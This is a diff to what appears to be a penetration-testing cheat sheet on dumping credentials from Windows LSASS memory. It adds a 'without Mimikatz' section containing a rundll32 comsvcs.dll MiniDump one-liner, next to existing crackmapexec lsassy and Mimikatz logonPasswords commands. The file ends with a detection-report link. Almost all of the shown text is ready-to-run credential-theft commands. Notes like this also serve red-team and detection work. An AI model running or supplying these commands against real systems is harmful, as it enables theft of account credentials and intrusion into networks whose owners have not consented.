@@ -16,6 +16,13 @@ crackmapexec smb $ip -u $username -p $password -M lsassy
 sekurlsa::logonPasswords
 ```
 
+### Dumping LSASS without Mimikatz
+
+```bash
+## https://twitter.com/inversecos/status/1450331995112804358?s=20&t=rMzsQI6ENH2SYVVaTYTqAA
+rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).Id Temp\output.dmp full;Wait-Process -Id (Get-Process rundll32).id
+```
+
 ### References
 
 {% embed url="https://redcanary.com/threat-detection-report/techniques/lsass-memory/" %}
